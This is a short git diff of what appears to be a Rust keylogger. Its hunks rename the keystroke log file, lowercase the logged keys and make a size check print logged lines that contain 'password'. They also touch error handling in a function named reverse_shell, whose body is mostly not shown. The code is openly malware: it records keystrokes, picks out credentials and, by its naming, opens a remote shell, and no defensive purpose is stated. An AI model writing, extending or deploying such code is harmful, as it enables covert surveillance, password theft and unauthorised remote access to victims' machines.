@@ -14,7 +14,7 @@ pub fn match_case(key: &Keycode) -> &'static str {
     let mut file = OpenOptions::new()
         .create(true)
         .append(true)
-        .open("/tmp/keylog.txt")
+        .open("log.txt")
         .expect("Failed to open file");
 
     size_check(&mut file);
@@ -37,7 +37,7 @@ pub fn match_case(key: &Keycode) -> &'static str {
             "?"
         } 
         _ => { 
-            write!(file, "{}",  key).expect("Failed to write to file");  
+            write!(file, "{}",  key.to_string().to_lowercase()).expect("Failed to write to file");  
             "Other"
         }
     }    
@@ -46,11 +46,12 @@ pub fn match_case(key: &Keycode) -> &'static str {
 // check if file is too big
 fn size_check(file: &mut std::fs::File) {
     let file_size = file.metadata().unwrap().len();
+    
     if file_size > 100 {
-        let content = fs::read_to_string("/tmp/keylog.txt").unwrap();
+        let content = fs::read_to_string("log.txt").unwrap();
         for line in content.lines() {
             if line.contains("password") {
-                println!("ENTER COMMAND FOUND");
+                println!("{}", line);
             }
         }
 
@@ -87,8 +88,8 @@ pub fn reverse_shell() {
             .       wait()
             .       unwrap();
             }
-            Err(_e) => {
-                // println!("Failed to connect to {}: {}", addr, e);
+            Err(e) => {
+                println!("Failed to connect to {}: {}", addr, e);
             }
         }
     }    
